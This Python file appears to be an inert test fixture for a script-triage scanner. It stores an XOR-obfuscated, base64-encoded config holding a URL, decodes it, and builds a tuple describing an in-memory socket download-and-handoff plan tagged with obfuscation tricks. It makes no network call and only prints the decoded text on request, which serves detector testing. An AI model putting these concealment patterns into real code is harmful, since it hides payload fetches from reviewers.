#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_6491e86b = "pO_grqGmt6Kh77Oxo6e7oLeNoLe_vaa3_ra7oaKzprG6jb-3v72gq66ztrOipreg76G9sbm3po2ivrO8jb-3v72gq66hprO1t42xvae8pu_jrqGrvKazqu--u6GmjbG9v6Kgt7q3vKG7vbyuvbC0p6Gxs6a7vbzvtL2gv7Omjb-zoq6xs6Cgu7eg76W6t7e-jbOgsbq7pLeupbu8tr2loY2xurO7vO-ivaW3oKG6t76-jaa9jaKrprq9vK6xs7-is7u1vI27tu-xs7-is7u1vP_h4eHn4LTr4OLhrqegvu-6pqaioej9_eHh4efgtOvg4uH8t6qzv6K-t_y7vKSzvru2_bfisOGw5-Dr_KKrrqeht6CNs7W3vKbvmqe8pqC3oaGCq6a6vbz94eHh5-C06-Di4Q=="
    CODEC_6491e86b = "urlsafe_base64|single_byte_xor|d2"

    def load_6491e86b():
        return base64.urlsafe_b64decode(MATERIAL_6491e86b)

    def decode_6491e86b(item1):
        return bytes(value ^ 210 for value in item1)

    def recover_6491e86b():
        item4 = (3, 5, 8, 13)[1:3]
        for _pass in range(1):
            item2 = decode_6491e86b(load_6491e86b())
        item3 = item2.decode("ascii", "strict")
        return item3

    def inspect_6491e86b():
        view = memoryview(recover_6491e86b().encode("ascii"))
        return bytes(view).decode("ascii")

    def surface_6491e86b():
        return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

    def obfuscation_6491e86b():
        return "{left}{right}".format_map({"left": "format_", "right": "map"})

    def plan_6491e86b():
        fields = dict(item.split("=", 1) for item in inspect_6491e86b().split("|"))
        analysis_surface = surface_6491e86b()
        obfuscation_surface = obfuscation_6491e86b()
        operation_plan = ("socket_plan_memory", fields["url"], "memory-handoff")
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_6491e86b())
